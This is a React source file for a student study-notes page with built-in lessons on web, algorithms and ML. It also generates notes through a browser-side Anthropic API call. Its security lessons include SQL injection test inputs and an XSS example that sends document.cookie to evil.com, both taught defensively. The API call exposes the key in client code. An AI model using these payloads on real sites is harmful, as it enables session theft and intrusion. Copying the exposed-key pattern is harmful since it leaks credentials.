import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { Plus, Pin, Code, Search,
         Trash2, Save, X, BookOpen,
         Library, Zap, Copy } from 'lucide-react';
import DashboardLayout from '../../components/layout/DashboardLayout';
import { supabase } from '../../lib/supabase';
import useStore from '../../store/useStore';
import toast from 'react-hot-toast';

const TOPICS = ['All','DSA','Web Dev','React','Node.js',
  'Python','Database','System Design','Algorithms',
  'Security','DevOps','AI/ML','Other'];

const DOMAIN_NOTES = {
  fullstack: [
    {
      title: 'How the Web Works',
      topic: 'Web Dev',
      pinned: true,
      theory: `🧠 CONCEPT:
When you type a URL, your browser sends an HTTP request to a server.
The server responds with HTML, CSS, and JavaScript.
Your browser renders it into a webpage you can see.

💡 REAL EXAMPLE:
You type "google.com"
→ DNS finds IP address (like a phone book)
→ Browser connects to Google server
→ Server sends HTML file
→ Browser renders the page

📝 KEY POINTS:
- HTTP = stateless protocol (each request is independent)
- HTTPS = HTTP + SSL encryption (secure)
- Status codes: 200 OK, 404 Not Found, 500 Server Error
- Request = question, Response = answer
- DNS converts domain names to IP addresses

🔥 REMEMBER:
"Every webpage is just a conversation between browser and server"`,
      code: `// Making a web request in JavaScript
// Simple way
fetch("https://api.example.com/users")
  .then(response => response.json())
  .then(data => console.log(data))
  .catch(error => console.error(error));

// Modern way with async/await (PREFERRED)
const getData = async () => {
  try {
    const response = await fetch("https://api.example.com/users");

    // Check if request was successful
    if (!response.ok) {
      throw new Error("Request failed: " + response.status);
    }

    const data = await response.json();
    console.log(data);
    return data;
  } catch (error) {
    console.error("Error:", error);
  }
};

getData();`,
      language: 'javascript',
    },
    {
      title: 'JavaScript: var vs let vs const',
      topic: 'Web Dev',
      pinned: true,
      theory: `🧠 CONCEPT:
Three ways to declare variables in JavaScript.
Each has different rules about scope and reassignment.

💡 REAL EXAMPLE:
const for things that NEVER change → const API_URL = "..."
let for things that CHANGE → let counter = 0
var → NEVER use it (it causes bugs)

📝 KEY POINTS:
- const = cannot reassign the binding (use by DEFAULT)
- let = can reassign, block-scoped (use when you need to change)
- var = function-scoped, hoisted (AVOID completely)
- const object/array PROPERTIES can be changed
- Only the variable binding is locked, not the value inside

🔥 REMEMBER:
"Always start with const. Switch to let only when you NEED to reassign."`,
      code: `// ✅ CONST - cannot reassign
const API_URL = "https://api.example.com";
const MAX_USERS = 100;
// API_URL = "other"; // ❌ ERROR - cannot reassign

// ✅ LET - can reassign
let score = 0;
let userName = "Abhishek";
score = 10;       // ✅ OK
userName = "Abhi"; // ✅ OK

// ❌ VAR - avoid this
var oldStyle = "bad";  // function-scoped, hoisted

// TRICKY: const with objects
const user = { name: "Abhishek", age: 21 };
user.name = "Abhi";  // ✅ OK - changing property
user.age = 22;       // ✅ OK - changing property
// user = {};        // ❌ ERROR - cannot reassign variable

// TRICKY: const with arrays
const scores = [90, 85, 92];
scores.push(88);     // ✅ OK - modifying array
scores[0] = 95;      // ✅ OK - changing element
// scores = [];      // ❌ ERROR - cannot reassign`,
      language: 'javascript',
    },
    {
      title: 'React useState Hook — Complete Guide',
      topic: 'React',
      pinned: false,
      theory: `🧠 CONCEPT:
useState lets React components REMEMBER values between renders.
Without it, all variables reset every time component re-renders.

💡 REAL EXAMPLE:
A counter button needs to remember the count.
Without useState → count resets to 0 every click.
With useState → count persists and updates UI.

📝 KEY POINTS:
- useState returns [currentValue, setterFunction]
- Calling setter triggers a RE-RENDER
- NEVER mutate state directly (user.name = "x" ← WRONG)
- State updates are ASYNCHRONOUS
- Use functional update when depending on previous state
- Each component instance has its OWN state

🔥 REMEMBER:
"setState does not update immediately — React batches updates for performance"`,
      code: `import { useState } from "react";

// BASIC COUNTER
function Counter() {
  const [count, setCount] = useState(0); // initial value = 0

  return (
    <div>
      <p>Count: {count}</p>
      <button onClick={() => setCount(count + 1)}>+1</button>
      <button onClick={() => setCount(prev => prev - 1)}>-1</button>
      <button onClick={() => setCount(0)}>Reset</button>
    </div>
  );
}

// OBJECT STATE - always spread previous state
function ProfileForm() {
  const [form, setForm] = useState({
    name: "",
    email: "",
    college: ""
  });

  const handleChange = (field, value) => {
    setForm(prev => ({
      ...prev,          // keep all other fields
      [field]: value    // update only this field
    }));
  };

  return (
    <div>
      <input
        value={form.name}
        onChange={e => handleChange("name", e.target.value)}
        placeholder="Name"
      />
      <p>Hello, {form.name}!</p>
    </div>
  );
}`,
      language: 'javascript',
    },
    {
      title: 'REST API: CRUD Operations',
      topic: 'Node.js',
      pinned: false,
      theory: `🧠 CONCEPT:
REST API uses HTTP methods for CRUD operations.
Every backend you build will use these 4 operations.
CRUD = Create, Read, Update, Delete.

💡 REAL EXAMPLE:
A todo app API:
GET    /todos      → get all todos (Read)
POST   /todos      → create new todo (Create)
PUT    /todos/1    → update todo #1 (Update)
DELETE /todos/1    → delete todo #1 (Delete)

📝 KEY POINTS:
- GET = Read data (no request body)
- POST = Create new resource (has body)
- PUT = Replace entire resource
- PATCH = Update part of resource
- DELETE = Remove resource
- Always return proper HTTP status codes
- Always send Content-Type: application/json header

🔥 REMEMBER:
"REST is just CONVENTIONS for HTTP. Follow them consistently."`,
      code: `const express = require("express");
const app = express();
app.use(express.json()); // parse JSON bodies

let todos = []; // in-memory storage

// READ ALL - GET /todos
app.get("/todos", (req, res) => {
  res.status(200).json(todos);
});

// READ ONE - GET /todos/:id
app.get("/todos/:id", (req, res) => {
  const todo = todos.find(t => t.id === parseInt(req.params.id));
  if (!todo) return res.status(404).json({ error: "Not found" });
  res.json(todo);
});

// CREATE - POST /todos
app.post("/todos", (req, res) => {
  const todo = {
    id: Date.now(),
    title: req.body.title,
    done: false,
    createdAt: new Date()
  };
  todos.push(todo);
  res.status(201).json(todo); // 201 = Created
});

// UPDATE - PUT /todos/:id
app.put("/todos/:id", (req, res) => {
  const id = parseInt(req.params.id);
  todos = todos.map(t =>
    t.id === id ? { ...t, ...req.body } : t
  );
  const updated = todos.find(t => t.id === id);
  res.json(updated);
});

// DELETE - DELETE /todos/:id
app.delete("/todos/:id", (req, res) => {
  const id = parseInt(req.params.id);
  todos = todos.filter(t => t.id !== id);
  res.json({ message: "Deleted successfully" });
});

app.listen(3000, () => console.log("Server running on port 3000"));`,
      language: 'javascript',
    },
    {
      title: 'SQL: Essential Queries',
      topic: 'Database',
      pinned: false,
      theory: `🧠 CONCEPT:
SQL = Structured Query Language.
Used to communicate with relational databases.
Every backend developer MUST know SQL.

💡 REAL EXAMPLE:
Instagram uses SQL to:
- Find all posts by a user
- Get followers count
- Show posts from people you follow

📝 KEY POINTS:
- SELECT = Read data from table
- INSERT = Add new rows
- UPDATE = Modify existing rows
- DELETE = Remove rows
- WHERE = Filter results
- JOIN = Combine data from multiple tables
- INDEX = Speed up slow queries
- Always use parameterized queries (prevent SQL injection)

🔥 REMEMBER:
"SQL is not a programming language — it is a QUERY language. Think in sets, not loops."`,
      code: `-- SELECT with filter
SELECT name, email, score
FROM users
WHERE active = true
ORDER BY score DESC
LIMIT 10;

-- INSERT new record
INSERT INTO users (name, email, college, domain)
VALUES ('Abhishek', 'abhi@gmail.com', 'KLEIT', 'fullstack');

-- UPDATE specific record
UPDATE users
SET score = 500, last_active = NOW()
WHERE id = 1;

-- DELETE record
DELETE FROM users WHERE id = 1;

-- JOIN two tables
SELECT u.name, p.score, p.domain
FROM users u
INNER JOIN profiles p ON u.id = p.user_id
WHERE p.score > 200
ORDER BY p.score DESC;

-- COUNT and GROUP
SELECT domain, COUNT(*) as total_students, AVG(score) as avg_score
FROM profiles
GROUP BY domain
HAVING COUNT(*) > 5
ORDER BY avg_score DESC;

-- Parameterized query (SAFE - prevents SQL injection)
-- In Node.js with pg:
const result = await db.query(
  'SELECT * FROM users WHERE email = $1',
  [userEmail]  // ✅ Safe - never concatenate!
);`,
      language: 'sql',
    },
  ],
  cybersecurity: [
    {
      title: 'SQL Injection: Attack and Defense',
      topic: 'Security',
      pinned: true,
      theory: `🧠 CONCEPT:
SQL Injection happens when user input is directly put into SQL query.
Attacker can steal, modify, or delete your ENTIRE database.
It is the #1 web vulnerability for 10+ years.

💡 REAL EXAMPLE:
Login form:
username = admin
password = anything' OR '1'='1

Query becomes:
WHERE username='admin' AND password='anything' OR '1'='1'
'1'='1' is ALWAYS true → Attacker logs in without password!

📝 KEY POINTS:
- NEVER concatenate user input into SQL strings
- ALWAYS use parameterized queries / prepared statements
- Use an ORM (Prisma, Sequelize) which auto-prevents SQLi
- Validate and sanitize ALL user inputs
- Use principle of least privilege for DB user
- Test by entering apostrophe (') in input fields

🔥 REMEMBER:
"Never trust user input. EVER. Treat all user data as malicious."`,
      code: `// ❌ VULNERABLE CODE - Never do this!
const username = req.body.username; // user controls this!
const query = "SELECT * FROM users WHERE username = '" + username + "'";
// Attack input: ' OR '1'='1' --
// Resulting query: SELECT * FROM users WHERE username = '' OR '1'='1' --'
// This returns ALL users!

// ✅ SAFE - Parameterized Query (Node.js + pg)
const query = "SELECT * FROM users WHERE username = $1";
const result = await db.query(query, [username]); // username is escaped

// ✅ SAFE - Using Prisma ORM
const user = await prisma.user.findUnique({
  where: { username: username } // Prisma auto-escapes everything
});

// ✅ SAFE - Using Supabase
const { data } = await supabase
  .from('users')
  .select('*')
  .eq('username', username); // Supabase auto-escapes

// TESTING for SQLi vulnerability - try these inputs:
// 1. Single quote: '
// 2. Double quote: "
// 3. Boolean: ' OR '1'='1
// 4. Comment: ' --
// 5. UNION: ' UNION SELECT null,null --
// If any cause errors or weird behavior = VULNERABLE!`,
      language: 'javascript',
    },
    {
      title: 'XSS: Cross Site Scripting',
      topic: 'Security',
      pinned: true,
      theory: `🧠 CONCEPT:
XSS injects malicious JavaScript into websites.
Attacker can steal cookies, hijack sessions, redirect users.
Affects millions of websites.

💡 REAL EXAMPLE:
Comment box attack:
User posts: <script>document.location='http://evil.com?cookie='+document.cookie</script>
When others view the page, the script runs.
Their session cookies get sent to the attacker!

📝 KEY POINTS:
- Stored XSS = malicious script saved in database
- Reflected XSS = script in URL parameter
- DOM-based XSS = script in client-side code
- Always HTML-encode user input before displaying
- Use Content Security Policy (CSP) headers
- HttpOnly cookies cannot be stolen via XSS
- React auto-escapes JSX = protected by default

🔥 REMEMBER:
"Any user input displayed on page = potential XSS. Always escape output."`,
      code: `// ❌ VULNERABLE - Setting innerHTML directly
document.getElementById('comment').innerHTML = userInput;
// If userInput = "<script>alert('XSS')</script>" → ATTACK!

// ❌ VULNERABLE - Using dangerouslySetInnerHTML in React
<div dangerouslySetInnerHTML={{ __html: userComment }} />

// ✅ SAFE - React auto-escapes JSX
<div>{userComment}</div>  // React escapes this automatically

// ✅ SAFE - Escape HTML function
const escapeHTML = (str) => {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
};

document.getElementById('comment').textContent = userInput; // ✅ Safe

// ✅ SAFE - Content Security Policy header (Express)
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self'"
  );
  next();
});

// ✅ SAFE - HttpOnly cookies (XSS cannot steal them)
res.cookie('sessionId', token, {
  httpOnly: true,  // Cannot be accessed by JavaScript
  secure: true,    // Only sent over HTTPS
  sameSite: 'strict'
});`,
      language: 'javascript',
    },
    {
      title: 'Two Pointer Technique',
      topic: 'Algorithms',
      pinned: true,
      theory: `🧠 CONCEPT:
Two pointer technique uses two indices moving through array.
Reduces O(n²) brute force solutions to O(n).
Used in 30% of array interview problems.

💡 REAL EXAMPLE:
Find if two numbers in sorted array sum to target.
Brute force: check every pair = O(n²) = slow.
Two pointer: left starts at 0, right at end.
If sum too small → move left right.
If sum too big → move right left.
= O(n) = fast!

📝 KEY POINTS:
- Works best on SORTED arrays
- Left pointer starts at index 0
- Right pointer starts at last index
- Move pointers based on condition
- O(n) time, O(1) space
- Common uses: Two Sum, palindrome check, remove duplicates

🔥 REMEMBER:
"When you see SORTED ARRAY + find PAIR = think Two Pointer first!"`,
      code: `// TWO SUM in sorted array
function twoSum(arr, target) {
  let left = 0;
  let right = arr.length - 1;

  while (left < right) {
    const sum = arr[left] + arr[right];

    if (sum === target) {
      return [left, right]; // ✅ Found!
    } else if (sum < target) {
      left++;  // Need bigger sum → move left pointer right
    } else {
      right--; // Need smaller sum → move right pointer left
    }
  }
  return [-1, -1]; // Not found
}

// Test
console.log(twoSum([1, 3, 5, 7, 9], 8));  // [1, 2] → 3+5=8
console.log(twoSum([1, 3, 5, 7, 9], 20)); // [-1, -1] not found

// PALINDROME CHECK
function isPalindrome(str) {
  let left = 0;
  let right = str.length - 1;

  while (left < right) {
    if (str[left] !== str[right]) {
      return false; // Not palindrome
    }
    left++;
    right--;
  }
  return true; // Is palindrome
}

console.log(isPalindrome("racecar")); // true
console.log(isPalindrome("hello"));   // false

// REMOVE DUPLICATES from sorted array (in-place)
function removeDuplicates(nums) {
  if (nums.length === 0) return 0;
  let slow = 0; // Points to last unique element

  for (let fast = 1; fast < nums.length; fast++) {
    if (nums[fast] !== nums[slow]) {
      slow++;
      nums[slow] = nums[fast];
    }
  }
  return slow + 1; // Count of unique elements
}`,
      language: 'javascript',
    },
  ],
  dsa: [
    {
      title: 'Binary Search: Complete Template',
      topic: 'Algorithms',
      pinned: true,
      theory: `🧠 CONCEPT:
Binary search halves the search space each iteration.
O(log n) instead of O(n) linear search.
Only works on SORTED data.

💡 REAL EXAMPLE:
Finding word in dictionary.
Open middle → word before or after?
Eliminate half → open middle of remaining.
Repeat until found.
1000 pages → maximum 10 steps (log₂ 1000 ≈ 10)

📝 KEY POINTS:
- Array MUST be sorted
- mid = left + (right-left)/2 (prevents integer overflow)
- 3 cases: found it, go left, go right
- Template: while(left <= right)
- O(log n) time, O(1) space
- Not just for searching — also for "find minimum X satisfying condition"

🔥 REMEMBER:
"Binary search is not just finding elements.
It is finding the BOUNDARY of a condition."`,
      code: `// CLASSIC BINARY SEARCH - Find target in sorted array
function binarySearch(arr, target) {
  let left = 0;
  let right = arr.length - 1;

  while (left <= right) {
    // Prevents integer overflow (important in other languages)
    const mid = left + Math.floor((right - left) / 2);

    if (arr[mid] === target) {
      return mid;      // ✅ Found at index mid
    } else if (arr[mid] < target) {
      left = mid + 1;  // Target is in RIGHT half
    } else {
      right = mid - 1; // Target is in LEFT half
    }
  }
  return -1; // Not found
}

// Test
const sorted = [1, 3, 5, 7, 9, 11, 13, 15];
console.log(binarySearch(sorted, 7));  // 3
console.log(binarySearch(sorted, 6));  // -1

// FIND FIRST OCCURRENCE (when duplicates exist)
function findFirst(arr, target) {
  let left = 0;
  let right = arr.length - 1;
  let result = -1;

  while (left <= right) {
    const mid = left + Math.floor((right - left) / 2);
    if (arr[mid] === target) {
      result = mid;    // Save result
      right = mid - 1; // Keep searching LEFT for earlier occurrence
    } else if (arr[mid] < target) {
      left = mid + 1;
    } else {
      right = mid - 1;
    }
  }
  return result;
}

// SEARCH IN ROTATED SORTED ARRAY (LeetCode 33)
function searchRotated(nums, target) {
  let left = 0;
  let right = nums.length - 1;

  while (left <= right) {
    const mid = left + Math.floor((right - left) / 2);
    if (nums[mid] === target) return mid;

    // Left half is sorted
    if (nums[left] <= nums[mid]) {
      if (target >= nums[left] && target < nums[mid]) {
        right = mid - 1;
      } else {
        left = mid + 1;
      }
    } else { // Right half is sorted
      if (target > nums[mid] && target <= nums[right]) {
        left = mid + 1;
      } else {
        right = mid - 1;
      }
    }
  }
  return -1;
}`,
      language: 'javascript',
    },
    {
      title: 'Dynamic Programming: Memoization',
      topic: 'Algorithms',
      pinned: false,
      theory: `🧠 CONCEPT:
Store results of expensive function calls.
Return cached result when same inputs occur again.
Turns exponential time into polynomial time.

💡 REAL EXAMPLE:
Fibonacci without DP:
fib(5) calls fib(4) and fib(3)
fib(4) calls fib(3) and fib(2)
fib(3) is calculated MULTIPLE TIMES = wasteful
With memoization: calculate once, store, reuse.

📝 KEY POINTS:
- Identify OVERLAPPING subproblems
- Define STATE (what changes between subproblems)
- Add memo/cache object
- Always define BASE CASES first
- Top-down = recursion + cache (memoization)
- Bottom-up = iteration (tabulation) = faster

🔥 REMEMBER:
"If you see recursion with repeated calculations = DP opportunity"`,
      code: `// WITHOUT MEMOIZATION - O(2^n) exponential
function fibSlow(n) {
  if (n <= 1) return n;
  return fibSlow(n - 1) + fibSlow(n - 2);
}
// fib(40) = over 1 billion operations ❌

// WITH MEMOIZATION - O(n) linear
function fibMemo(n, memo = {}) {
  if (n in memo) return memo[n]; // Return cached result
  if (n <= 1) return n;          // Base case

  memo[n] = fibMemo(n-1, memo) + fibMemo(n-2, memo);
  return memo[n];
}
// fib(40) = 40 operations ✅

// TABULATION (bottom-up) - O(n) time, O(1) space
function fibTab(n) {
  if (n <= 1) return n;
  let prev2 = 0, prev1 = 1;

  for (let i = 2; i <= n; i++) {
    const curr = prev1 + prev2;
    prev2 = prev1;
    prev1 = curr;
  }
  return prev1;
}

// COIN CHANGE (Classic DP - LeetCode 322)
// Minimum coins to make amount
function coinChange(coins, amount) {
  // dp[i] = minimum coins to make amount i
  const dp = new Array(amount + 1).fill(Infinity);
  dp[0] = 0; // Base case: 0 coins for amount 0

  for (let i = 1; i <= amount; i++) {
    for (const coin of coins) {
      if (coin <= i) {
        dp[i] = Math.min(dp[i], dp[i - coin] + 1);
      }
    }
  }

  return dp[amount] === Infinity ? -1 : dp[amount];
}

console.log(coinChange([1, 5, 10, 25], 36)); // 3 (25+10+1)`,
      language: 'javascript',
    },
  ],
  aiml: [
    {
      title: 'Linear Regression: The Foundation',
      topic: 'AI/ML',
      pinned: true,
      theory: `🧠 CONCEPT:
Linear regression finds the best straight line through data.
Used to predict continuous values (price, score, temperature).
The "Hello World" of machine learning.

💡 REAL EXAMPLE:
Predict house price based on size:
500 sqft → ₹25 lakh
750 sqft → ₹37.5 lakh
1000 sqft → ₹50 lakh
Pattern: price = 0.05 × sqft
Linear regression finds this relationship automatically!

📝 KEY POINTS:
- y = mx + b (line equation)
- m = slope (how much y changes per unit of x)
- b = y-intercept (value when x = 0)
- Loss function = Mean Squared Error (MSE)
- Gradient descent minimizes the loss
- R² score = how well line fits data (1.0 = perfect)
- Training: model learns m and b from data

🔥 REMEMBER:
"Linear regression finds a line. All of ML is finding the right function."`,
      code: `# Linear Regression with scikit-learn
import numpy as np
from sklearn.linear_model import LinearRegression
from sklearn.model_selection import train_test_split
from sklearn.metrics import r2_score, mean_squared_error

# Training data: house size (sqft) vs price (lakhs)
X = np.array([[500], [750], [1000], [1250], [1500],
              [1750], [2000], [2250], [2500]])
y = np.array([25, 37.5, 50, 62.5, 75, 87.5, 100, 112.5, 125])

# Split into train and test sets (80/20 split)
X_train, X_test, y_train, y_test = train_test_split(
    X, y, test_size=0.2, random_state=42
)

# Create and train the model
model = LinearRegression()
model.fit(X_train, y_train)

# Make predictions
y_pred = model.predict(X_test)

# Evaluate the model
r2 = r2_score(y_test, y_pred)
mse = mean_squared_error(y_test, y_pred)

print(f"Slope (m): {model.coef_[0]:.4f}")
print(f"Intercept (b): {model.intercept_:.4f}")
print(f"R² Score: {r2:.4f}")  # 1.0 = perfect fit
print(f"MSE: {mse:.4f}")

# Predict new house price
new_house = np.array([[1100]])
predicted_price = model.predict(new_house)
print(f"1100 sqft house → ₹{predicted_price[0]:.1f} lakhs")`,
      language: 'python',
    },
  ],
};

const getAllNotesForDomain = (domain) => {
  const base = DOMAIN_NOTES[domain] || DOMAIN_NOTES['fullstack'];
  const common = DOMAIN_NOTES['dsa'] || [];
  return [...base, ...common.slice(0, 2)];
};

const CodeBlock = ({ code, language }) => {
  const copy = () => {
    navigator.clipboard.writeText(code);
    toast.success('Code copied! 📋');
  };
  return (
    <div className="mt-3 rounded-xl overflow-hidden">
      <div className="flex items-center justify-between px-4 py-2"
        style={{ background:'#030305', borderBottom:'1px solid rgba(0,255,148,0.08)' }}>
        <div className="flex items-center gap-2">
          <div className="flex gap-1">
            <div className="w-2.5 h-2.5 rounded-full bg-danger/70"/>
            <div className="w-2.5 h-2.5 rounded-full bg-warning/70"/>
            <div className="w-2.5 h-2.5 rounded-full bg-success/70"/>
          </div>
          <span className="text-xs text-gray-600 font-mono">{language}</span>
        </div>
        <button onClick={copy}
          className="flex items-center gap-1 text-xs text-gray-600 hover:text-primary transition-colors">
          <Copy size={10}/> Copy
        </button>
      </div>
      <pre className="px-4 py-3 text-xs font-mono text-gray-300 overflow-x-auto leading-relaxed"
        style={{ background:'#030305', maxHeight:'300px' }}>
        <code>{code}</code>
      </pre>
    </div>
  );
};

const Notes = () => {
  const { profile } = useStore();
  const [tab, setTab] = useState('library');
  const [myNotes, setMyNotes] = useState([]);
  const [search, setSearch] = useState('');
  const [topic, setTopic] = useState('All');
  const [creating, setCreating] = useState(false);
  const [loading, setLoading] = useState(true);
  const [saving, setSaving] = useState(false);
  const [generating, setGenerating] = useState(false);
  const [showCode, setShowCode] = useState(false);
  const [expanded, setExpanded] = useState({});
  const [form, setForm] = useState({
    title:'', content:'', code_snippet:'',
    code_language:'javascript', topic:'Other', is_pinned:false,
  });

  const domain = profile?.domain_id || 'fullstack';
  const studyNotes = getAllNotesForDomain(domain);

  const filteredStudy = studyNotes.filter(n => {
    const matchTopic = topic === 'All' || n.topic === topic;
    const matchSearch = !search ||
      n.title.toLowerCase().includes(search.toLowerCase()) ||
      n.theory.toLowerCase().includes(search.toLowerCase());
    return matchTopic && matchSearch;
  });

  useEffect(() => {
    if (profile?.id) fetchMyNotes();
  }, [profile?.id]);

  const fetchMyNotes = async () => {
    setLoading(true);
    const { data } = await supabase
      .from('notes').select('*')
      .eq('student_id', profile.id)
      .order('is_pinned', { ascending: false })
      .order('created_at', { ascending: false });
    setMyNotes(data || []);
    setLoading(false);
  };

  const generateAINote = async () => {
    if (!form.title.trim()) {
      toast.error('Enter a topic title first!');
      return;
    }
    setGenerating(true);
    toast.loading('AI generating notes...', { id: 'ai' });

    try {
      const response = await fetch('https://api.anthropic.com/v1/messages', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'x-api-key': import.meta.env.VITE_CLAUDE_API_KEY,
          'anthropic-version': '2023-06-01',
          'anthropic-dangerous-direct-browser-access': 'true',
        },
        body: JSON.stringify({
          model: 'claude-sonnet-4-20250514',
          max_tokens: 1500,
          messages: [{
            role: 'user',
            content: `Generate study notes for engineering student.
Topic: ${form.title}
Domain: ${profile?.domain_id || 'fullstack'}

Return ONLY this JSON format:
{
  "theory": "explanation in simple layman language with emoji sections: CONCEPT, REAL EXAMPLE, KEY POINTS (bullet points), REMEMBER tip",
  "code": "working code example with comments explaining each line",
  "language": "javascript or python or java",
  "topic": "DSA or Web Dev or React or Node.js or Python or Database or Security or AI/ML or Other"
}

Rules:
- Explain like talking to a friend, not a textbook
- Use simple words, real-world examples
- Code must be complete and runnable
- Add comments on every important line`
          }]
        })
      });

      const data = await response.json();
      const text = data.content?.[0]?.text || '';
      const clean = text.replace(/```json|```/g, '').trim();
      const parsed = JSON.parse(clean);

      setForm(prev => ({
        ...prev,
        content: parsed.theory || '',
        code_snippet: parsed.code || '',
        code_language: parsed.language || 'javascript',
        topic: parsed.topic || 'Other',
      }));
      setShowCode(true);
      toast.success('Notes generated! Review and save 📝', { id: 'ai' });
    } catch(e) {
      console.error(e);
      toast.error('AI generation failed. Write manually.', { id: 'ai' });
    }
    setGenerating(false);
  };

  const saveNote = async () => {
    if (!form.title.trim()) { toast.error('Add title'); return; }
    setSaving(true);
    const { error } = await supabase.from('notes').insert({
      title: form.title,
      content: form.content,
      code_snippet: form.code_snippet || null,
      code_language: form.code_language || 'javascript',
      topic: form.topic || 'Other',
      is_pinned: form.is_pinned,
      student_id: profile.id,
    });
    if (!error) {
      toast.success('Note saved! 📝');
      setForm({ title:'', content:'', code_snippet:'',
        code_language:'javascript', topic:'Other', is_pinned:false });
      setCreating(false);
      setShowCode(false);
      fetchMyNotes();
    } else {
      toast.error('Save failed: ' + error.message);
    }
    setSaving(false);
  };

  const deleteNote = async (id) => {
    await supabase.from('notes').delete().eq('id', id);
    fetchMyNotes();
    toast.success('Deleted');
  };

  const togglePin = async (note) => {
    await supabase.from('notes')
      .update({ is_pinned: !note.is_pinned }).eq('id', note.id);
    fetchMyNotes();
  };

  const toggleExpand = (id) => {
    setExpanded(prev => ({ ...prev, [id]: !prev[id] }));
  };

  return (
    <DashboardLayout>
      <div className="max-w-5xl mx-auto">

        {/* Header */}
        <div className="flex items-center justify-between mb-5 flex-wrap gap-3">
          <div>
            <h1 className="text-2xl font-bold font-heading text-white"
              style={{ textShadow:'0 0 15px rgba(0,255,148,0.3)' }}>
              📚 Study Notes
            </h1>
            <p className="text-gray-500 text-sm mt-0.5">
              Theory + Code examples · AI-powered · Domain-specific
            </p>
          </div>
          {tab === 'mynotes' && (
            <button onClick={() => setCreating(true)}
              className="flex items-center gap-2 px-4 py-2 rounded-xl font-bold text-sm text-dark-900"
              style={{ background:'#00FF94', boxShadow:'0 0 12px rgba(0,255,148,0.3)' }}>
              <Plus size={14}/> New Note
            </button>
          )}
        </div>

        {/* Tabs */}
        <div className="flex gap-2 mb-5">
          {[
            { id:'library', icon:<Library size={13}/>, label:'Study Library' },
            { id:'mynotes', icon:<BookOpen size={13}/>, label:'My Notes' },
          ].map(t => (
            <button key={t.id} onClick={() => setTab(t.id)}
              className="flex items-center gap-2 px-4 py-2 rounded-xl text-sm font-semibold transition-all"
              style={tab===t.id
                ? { background:'#00FF94', color:'#050508' }
                : { background:'rgba(18,18,26,0.8)', color:'#666', border:'1px solid rgba(34,34,51,0.5)' }
              }>
              {t.icon} {t.label}
            </button>
          ))}
        </div>

        {/* Search + Topics */}
        <div className="flex gap-2 mb-4 flex-wrap">
          <div className="relative flex-1 min-w-48">
            <Search size={13} className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-600"/>
            <input value={search} onChange={e => setSearch(e.target.value)}
              placeholder="Search notes..."
              className="w-full bg-dark-800 border border-dark-600 rounded-xl pl-9 pr-4 py-2 text-sm text-gray-100 placeholder-gray-600 focus:outline-none focus:border-primary"/>
          </div>
          <div className="flex gap-1.5 flex-wrap">
            {TOPICS.map(t => (
              <button key={t} onClick={() => setTopic(t)}
                className="px-2.5 py-1.5 rounded-lg text-xs font-medium transition-all"
                style={topic===t
                  ? { background:'#00FF94', color:'#050508' }
                  : { background:'rgba(18,18,26,0.8)', color:'#555', border:'1px solid rgba(34,34,51,0.5)' }
                }>
                {t}
              </button>
            ))}
          </div>
        </div>

        {/* STUDY LIBRARY */}
        {tab === 'library' && (
          <div className="space-y-4">
            {filteredStudy.length === 0 ? (
              <div className="text-center py-12">
                <div className="text-4xl mb-3">📚</div>
                <p className="text-gray-500 text-sm">No notes found for this filter</p>
              </div>
            ) : filteredStudy.map((note, i) => (
              <motion.div key={i}
                initial={{ opacity:0, y:8 }}
                animate={{ opacity:1, y:0 }}
                transition={{ delay:i*0.04 }}
                className="rounded-2xl overflow-hidden"
                style={{ background:'rgba(10,10,18,0.9)', border:'1px solid rgba(34,34,51,0.6)' }}>

                {/* Note header */}
                <button
                  onClick={() => toggleExpand(`study-${i}`)}
                  className="w-full flex items-start justify-between p-5 text-left hover:bg-white/[0.02] transition-colors">
                  <div className="flex items-start gap-3">
                    {note.pinned && <Pin size={12} className="text-warning mt-1 flex-shrink-0"/>}
                    <div>
                      <h3 className="font-bold text-white font-heading text-sm mb-1">
                        {note.title}
                      </h3>
                      <div className="flex items-center gap-2">
                        <span className="text-xs px-2 py-0.5 rounded-full"
                          style={{ background:'rgba(0,255,148,0.08)', color:'#00FF94', border:'1px solid rgba(0,255,148,0.15)' }}>
                          {note.topic}
                        </span>
                        <span className="text-xs text-gray-600 flex items-center gap-1">
                          <Code size={10}/> {note.language}
                        </span>
                      </div>
                    </div>
                  </div>
                  <span className="text-gray-600 text-xs mt-1 flex-shrink-0 ml-2">
                    {expanded[`study-${i}`] ? '▲' : '▼'}
                  </span>
                </button>

                {/* Expanded content */}
                <AnimatePresence>
                  {expanded[`study-${i}`] && (
                    <motion.div
                      initial={{ height:0, opacity:0 }}
                      animate={{ height:'auto', opacity:1 }}
                      exit={{ height:0, opacity:0 }}
                      className="px-5 pb-5">
                      <pre className="text-xs text-gray-300 leading-relaxed whitespace-pre-wrap font-sans mb-2">
                        {note.theory}
                      </pre>
                      {note.code && (
                        <CodeBlock code={note.code} language={note.language}/>
                      )}
                    </motion.div>
                  )}
                </AnimatePresence>
              </motion.div>
            ))}
          </div>
        )}

        {/* MY NOTES */}
        {tab === 'mynotes' && (
          <div className="flex gap-4">
            <div className="flex-1">
              {loading ? (
                <div className="space-y-3">
                  {[1,2,3].map(i => (
                    <div key={i} className="h-20 bg-dark-700 rounded-xl animate-pulse"/>
                  ))}
                </div>
              ) : myNotes.length === 0 && !creating ? (
                <div className="text-center py-12">
                  <div className="text-5xl mb-3">📝</div>
                  <h2 className="font-bold text-white font-heading mb-2">No notes yet</h2>
                  <p className="text-gray-500 text-sm mb-4">
                    Create notes or let AI generate them for you
                  </p>
                  <button onClick={() => setCreating(true)}
                    className="px-5 py-2.5 rounded-xl font-bold text-sm text-dark-900"
                    style={{ background:'#00FF94' }}>
                    + Create First Note
                  </button>
                </div>
              ) : (
                <div className="space-y-3">
                  {myNotes.filter(n =>
                    (topic==='All' || n.topic===topic) &&
                    (!search || n.title?.toLowerCase().includes(search.toLowerCase()))
                  ).map((note, i) => (
                    <motion.div key={note.id}
                      initial={{ opacity:0, y:5 }}
                      animate={{ opacity:1, y:0 }}
                      className="rounded-xl overflow-hidden"
                      style={{ background:'rgba(10,10,18,0.9)', border:'1px solid rgba(34,34,51,0.6)' }}>

                      <button
